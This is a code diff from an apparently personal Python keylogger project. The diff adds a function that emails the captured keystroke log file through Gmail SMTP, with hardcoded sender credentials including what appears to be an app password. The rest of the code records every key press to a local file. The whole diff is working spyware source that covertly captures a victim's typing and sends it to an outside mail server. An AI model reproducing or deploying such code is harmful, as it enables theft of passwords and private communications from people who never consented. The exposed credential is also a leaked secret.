@@ -36,20 +36,48 @@ from PIL import ImageGrab  # screenshot library
 # Default Variables
 
 keys_information = "key_log.txt"
+email_address = "trashkeylogger@gmail.com"  # trash email address
+password = "fyylgrzcjqftecbt"
+toaddr = "trashkeylogger@gmail.com"
 file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
 extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file
 
+# Email Functionality
+
+
+def send_email(filename, attachment, toaddr):
+    msg = MIMEMultipart()
+    msg['From'] = email_address
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
+    body = "Body of the Mail"
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attachment, 'rb')
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
+    msg.attach(p)
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(email_address, password)
+    text = msg.as_string()
+    s.sendmail(email_address, toaddr, text)
+    s.quit()
+
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+# Key Logger Functionality
 count = 0
 keys = []
 
 
 def on_press(key):
     global keys, count
-
-    print(key)
     keys.append(key)
     count += 1
-
     if count >= 1:
         count = 0
         write_file(keys)
@@ -59,18 +87,15 @@ def on_press(key):
 def write_file(keys):
     with open(file_path + extend + keys_information, "a") as f:
         for key in keys:
-            # it will remove the single quotes from the key so the key becomes readable
             k = str(key).replace("'", "")
-            if k.find("space") > 0:  # it will find the space in the key
+            if "space" in k:
                 f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
+            elif "Key" not in k:
                 f.write(k)
-                f.close()
 
 
 def on_release(key):
-    if key == Key.esc:  # if the key is escape button then it will stop the keylogger
+    if key == Key.esc:
         return False
 
 
